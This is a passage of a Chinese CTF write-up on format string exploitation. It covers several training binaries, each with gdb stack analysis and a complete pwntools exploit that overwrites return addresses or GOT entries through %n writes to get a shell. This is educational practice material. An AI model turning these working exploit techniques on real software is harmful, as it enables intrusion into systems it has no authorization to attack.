class="hljs-title">make_response</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">snprintf</span>(response, <span class="hljs-number">0x400</span>u, buf);&#125;</code></pre></div><p>代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。</p><h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><div class="hljs"><pre><code class="hljs html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 ("AAAA\n")0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (<span class="hljs-tag">&lt;<span class="hljs-name">_dl_fixup+11</span>&gt;</span>:add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (<span class="hljs-tag">&lt;<span class="hljs-name">echo+11</span>&gt;</span>:mov    DWORD PTR [esp],0x804a480)</code></pre></div><p>可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ：</p><div class="hljs"><pre><code class="hljs html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre></div><p><strong>也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用<code>%xc%4$hhn</code> 就可以修改0xffffd378（ebp3）。</strong><br><strong>将0xffffd378 改为指向ret address的栈地址  <code>0xffffd33c</code>  ：</strong></p><div class="hljs"><pre><code class="hljs html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (<span class="hljs-tag">&lt;<span class="hljs-name">echo+11</span>&gt;</span>:mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (<span class="hljs-tag">&lt;<span class="hljs-name">echo+11</span>&gt;</span>:mov    DWORD PTR [esp],0x804a480)</code></pre></div><p>改完也就是这样的效果。<br><strong>这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），</strong><br><strong>接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用<code>%xc%y$hhn</code> 就可以修改0x804852c（ret address）</strong></p><p>这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./ebp'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',29994)</span>buf = <span class="hljs-number">0x0804a080</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0c0</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(<span class="hljs-string">'%4$p'</span>)ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)key2 = <span class="hljs-number">0xa0c0</span>payload = <span class="hljs-string">'%&#123;&#125;c%4$hhn'</span>.format(key1)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recv()payload = <span class="hljs-string">'%&#123;&#125;c%12$hn'</span>.format(key2)payload = payload.ljust(<span class="hljs-number">0x40</span>) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre></div><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="保护和arch-5"><a href="#保护和arch-5" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><span class="hljs-attr">    RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span></code></pre></div><p>没有任何保护。</p><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fmt</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xC8</span>u);    result = <span class="hljs-built_in">strncmp</span>(buf, <span class="hljs-string">"quit"</span>, <span class="hljs-number">4u</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    <span class="hljs-built_in">printf</span>(buf);  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./playfmt'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',26382)</span>buf = <span class="hljs-number">0x0804A060</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0a0</span>offset1 = <span class="hljs-number">6</span>offset2 = <span class="hljs-number">10</span>info(<span class="hljs-string">'---leak stack address---'</span>)io.recvuntil(<span class="hljs-string">'\n=====================\n'</span>)io.sendline(<span class="hljs-string">'%10$p'</span>)ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))info(<span class="hljs-string">'---change the retaddr---'</span>)key = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)payload = <span class="hljs-string">"%&#123;&#125;c%6$hhn"</span>.format(key)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)sleep(<span class="hljs-number">0.1</span>)io.recv()key2 = <span class="hljs-number">0xa0a0</span>payload = <span class="hljs-string">"%&#123;&#125;c%10$hn"</span>.format(key2)payload = payload.ljust(<span class="hljs-number">0x40</span>)payload += asm(shellcraft.sh())raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recv()sleep(<span class="hljs-number">0.1</span>)io.sendline(<span class="hljs-string">'quit'</span>)io.interactive()</code></pre></div><p>记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="arch和保护"><a href="#arch和保护" class="headerlink" title="arch和保护"></a>arch和保护</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><p>开了nx了。</p><h3 id="ida分析-7"><a href="#ida分析-7" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">3</span>; ++k ) &#123;   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me some format strings(%d)\n"</span>, k + <span class="hljs-number">1</span>);   read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>u);   <span class="hljs-built_in">printf</span>(buf); &#125; <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wait a sec..."</span>); sleep(<span class="hljs-number">3u</span>);</code></pre></div><p>可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。</p><div class="hljs"><pre><code class="hljs c">execve(path, &amp;path, <span class="hljs-number">0</span>);</code></pre></div><p>且这一条可以给你拿到shell。</p><p>那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。<br>因为这里下面就调用一次sleep，就改它好了，基本不会出问题。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。</p><h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>此时的EBP = 0xffffd228 </p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd1e0</span> --&gt; <span class="hljs-number">0x804a100</span> (<span class="hljs-string">"AAAA\n"</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd1e4</span> --&gt; <span class="hljs-number">0x804a100</span> (<span class="hljs-string">"AAAA\n"</span>)<span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd1e8</span> --&gt; <span class="hljs-number">0x64</span> (<span class="hljs-string">'d'</span>)<span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd1ec</span> --&gt; <span class="hljs-number">0xf7f5b2a2</span> (<span class="hljs-string">"__vdso_clock_gettime"</span>)<span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd1f0</span> --&gt; <span class="hljs-number">0xf7fe1fc9</span> (&lt;do_lookup_x+<span class="hljs-number">9</span>&gt;:add    ebx,<span class="hljs-number">0x1b037</span>)<span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd1f4</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd1f8</span> --&gt; <span class="hljs-number">0xf7ffdad0</span> --&gt; <span class="hljs-number">0xf7ffda74</span> --&gt; <span class="hljs-number">0xf7fd3470</span> --&gt; <span class="hljs-number">0xf7ffd918</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd1fc</span> --&gt; <span class="hljs-number">0xffffd278</span> --&gt; <span class="hljs-number">0xf7e0b018</span> --&gt; <span class="hljs-number">0x3eab</span><span class="hljs-number">0032</span>| <span class="hljs-number">0xffffd200</span> --&gt; <span class="hljs-number">0xffffd2c0</span> --&gt; <span class="hljs-number">0x804a024</span> --&gt; <span class="hljs-number">0xf7ed6290</span> (&lt;close&gt;:cmp    DWORD PTR gs:<span class="hljs-number">0xc</span>,<span class="hljs-number">0x0</span>)<span class="hljs-number">0036</span>| <span class="hljs-number">0xffffd204</span> --&gt; <span class="hljs-number">0x8048870</span> (<span class="hljs-string">"/bin/sh"</span>)<span class="hljs-number">0040</span>| <span class="hljs-number">0xffffd208</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0044</span>| <span class="hljs-number">0xffffd20c</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0048</span>| <span class="hljs-number">0xffffd210</span> --&gt; <span class="hljs-number">0xffffd4a4</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0052</span>| <span class="hljs-number">0xffffd214</span> --&gt; <span class="hljs-number">0xffffdfce</span> --&gt; <span class="hljs-number">0x656d2f00</span> (<span class="hljs-string">''</span>)<span class="hljs-number">0056</span>| <span class="hljs-number">0xffffd218</span> --&gt; <span class="hljs-number">0xffffd230</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0060</span>| <span class="hljs-number">0xffffd21c</span> --&gt; <span class="hljs-number">0xffffd234</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0064</span>| <span class="hljs-number">0xffffd220</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0068</span>| <span class="hljs-number">0xffffd224</span> --&gt; <span class="hljs-number">0x1</span><span class="hljs-number">0072</span>| <span class="hljs-number">0xffffd228</span> --&gt; <span class="hljs-number">0xffffd378</span> --&gt; <span class="hljs-number">0x0</span></code></pre></div><p>可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。</strong>然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./fsb'</span>)<span class="hljs-comment"># s = ssh(</span><span class="hljs-comment">#     host="pwnable.kr",</span><span class="hljs-comment">#     port=2222,</span><span class="hljs-comment">#     user="fsb",</span><span class="hljs-comment">#     password="guest"</span><span class="hljs-comment"># )</span><span class="hljs-comment"># io = s.run("/home/fsb/fsb")</span><span class="hljs-comment"># io = shell.run("/home/fsb/fsb")</span>sleep_got = <span class="hljs-number">0x0804a008</span>info(<span class="hljs-string">'--------leak stack base:-------'</span>)io.recvuntil(<span class="hljs-string">'strings(1)\n'</span>)io.sendline(<span class="hljs-string">'%14$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)stack_base = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">80</span>print(hex(stack_base))info(<span class="hljs-string">'--------leak the point to main ebp:-------'</span>)io.recvuntil(<span class="hljs-string">'strings(2)\n'</span>)io.sendline(<span class="hljs-string">'%18$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)point = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)print(hex(point))info(<span class="hljs-string">'--------write sleep_got to main_ebp :-------'</span>)io.recvuntil(<span class="hljs-string">'strings(3)\n'</span>)key1 = <span class="hljs-number">0x0804A008</span>payload = <span class="hljs-string">'%'</span> + str(key1) + <span class="hljs-string">'c%18$n'</span>io.sendline(payload)info(<span class="hljs-string">'--------write tag to sleep_got :-------'</span>)tag = <span class="hljs-number">0x869F</span>offset = (point - stack_base) / <span class="hljs-number">4</span>payload = <span class="hljs-string">"%&#123;&#125;c%'str(offset)'$hn "</span>.format(tag)io.recvuntil(<span class="hljs-string">'strings(4)\n'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="保护和arch-6"><a href="#保护和arch-6" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="ida分析-8"><a href="#ida分析-8" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>这一处会让栈的情况变得无法预测。然后进入hardfmt：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )&#123;  read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x1000</span>u);  <span class="hljs-built_in">printf</span>(buff);&#125;</code></pre></div><p>这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。<br>（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。）</p><h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>仔细看下此时的栈情况 ，然后再次分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址</li></ul><p>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。<br>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针：</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e6c = 0xffbe5d54gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e64 = 0xffbe5d60</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址：</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d60  = 0x0804a016gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d54  = 0x0804a014</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以写system的内存地址上got了：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0120</span>| <span class="hljs-number">0xffbe5d88</span> --&gt; <span class="hljs-number">0xffbe5e6c</span> --&gt; <span class="hljs-number">0xffbe5d54</span> --&gt; <span class="hljs-number">0x804a014</span> --&gt; <span class="hljs-number">0xf7e0cda0</span> (&lt;__libc_system&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>)</code></pre></div><p>这样再传过去一下<code>/bin/sh</code>即可。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch =<span class="hljs-string">'i386'</span><span class="hljs-keyword">import</span> timeelf = ELF(<span class="hljs-string">'./echo3'</span>)debug = <span class="hljs-number">1</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">if</span> debug :        io = process(<span class="hljs-string">'./echo3'</span>)        libc = elf.libc    <span class="hljs-keyword">else</span>:        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25057</span>)        libc = ELF(<span class="hljs-string">'./libc-2.23.so.i386'</span>)    payload = <span class="hljs-string">'%43$pA%30$pA%47$p'</span>    io.sendline(payload)    address = io.recvline().strip()    <span class="hljs-keyword">if</span> address[<span class="hljs-number">-3</span>:] == <span class="hljs-string">'637'</span>:        <span class="hljs-keyword">if</span> address[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] == <span class="hljs-string">'637'</span>:            libc_base = int(address[<span class="hljs-number">2</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">247</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]            tag1_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x118</span>            tag2_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x104</span> - <span class="hljs-number">0x8</span>            system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]            print(<span class="hljs-string">'system_addr  -&gt;'</span> + hex(system_addr))            print(<span class="hljs-string">'tag1_stack_point -&gt;'</span> + hex(tag1_stack_point))            print(<span class="hljs-string">'tag2_stack_point -&gt;'</span> + hex(tag2_stack_point))            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span> :        io.close()        <span class="hljs-keyword">continue</span><span class="hljs-comment"># io = </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtshort</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtbyte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>    <span class="hljs-keyword">return</span> resultprintf_got = <span class="hljs-number">0x0804a014</span>key1 = int(hex(tag1_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key2 = int(hex(tag2_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)info(<span class="hljs-string">'--------change the two points to tag_stack_point:-------'</span>)<span class="hljs-comment"># raw_input('-&gt;')</span>prev = <span class="hljs-number">0</span>payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">30</span>+i)     prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">31</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'1111'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'1111'</span>)info(<span class="hljs-string">'--------change got_table to printf_got:-------'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key3 = <span class="hljs-number">0x14</span>key4 = <span class="hljs-number">0x16</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key3 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">87</span>+i)     prev = (key3 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key4 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">85</span>+i)     prev = (key4 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>payload = payload + <span class="hljs-string">'2222'</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'2222'</span>)info(<span class="hljs-string">'--------change printf_got to system_addr:-------'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key5 = int(hex(system_addr)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key6 = int(hex(system_addr)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)print(<span class="hljs-string">'key5 -&gt; '</span> + hex(key5))print(<span class="hljs-string">'key6 -&gt; '</span> + hex(key6))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key5 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">17</span>+i)     prev = (key5 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key6 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">20</span>+i)     prev = (key6 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'3333'</span>io.sendline(payload)sleep(<span class="hljs-number">1</span>)io.recvuntil(<span class="hljs-string">'3333'</span>)raw_input(<span class="hljs-string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>)io.interactive()</code></pre></div><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。<h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3></li></ul><p>这个题教会我一定要<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="保护和arch-7"><a href="#保护和arch-7" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined">CANARY    : <span class="hljs-type">disabled</span>FORTIFY   : <span class="hljs-type">disabled</span>NX        : 